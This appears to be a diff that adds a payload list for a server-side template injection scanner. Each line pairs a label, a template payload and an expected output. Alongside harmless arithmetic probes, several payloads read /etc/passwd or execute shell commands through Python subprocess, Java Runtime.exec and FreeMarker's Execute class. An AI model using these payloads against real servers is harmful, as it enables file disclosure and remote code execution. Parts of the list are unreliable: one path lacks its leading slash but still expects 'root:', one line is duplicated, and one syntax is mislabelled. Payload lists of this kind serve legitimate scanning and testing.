@@ -1,0 +1,17 @@
+Ruby SSTI injection::<%= 7*7 %>::49
+Ruby SSTI injection::#{ 7*7 }::49
+Java SSTI injection::${7*7}::49
+SSTI injection to LFI::<%= File.open('/etc/passwd').read %>::root:
+SSTI injection to LFI::{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}::root:
+SSTI injection to LFI::{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}::root:
+SSTI injection to RCE::{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}::root:
+Java SSTI injection to RCE::${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}::root:
+SSTI injection to RCE::[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}::root:
+Java SSTI injection::${{7*7}}::49
+Twig SSTI injection::{{7*7}}::49
+Jinja2 SSTI injection::[[7*7]]::49
+ASP.NET Razor SSTI injection::@(45+4)::49
+Java SSTI injection::${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}::root:
+Smarty SSTI injection::${'z'.join('ab')}::zab
+Jinja2 SSTI injection::{{7*'7'}}::7777777
+Twig SSTI injection::{{7*'7'}}::49
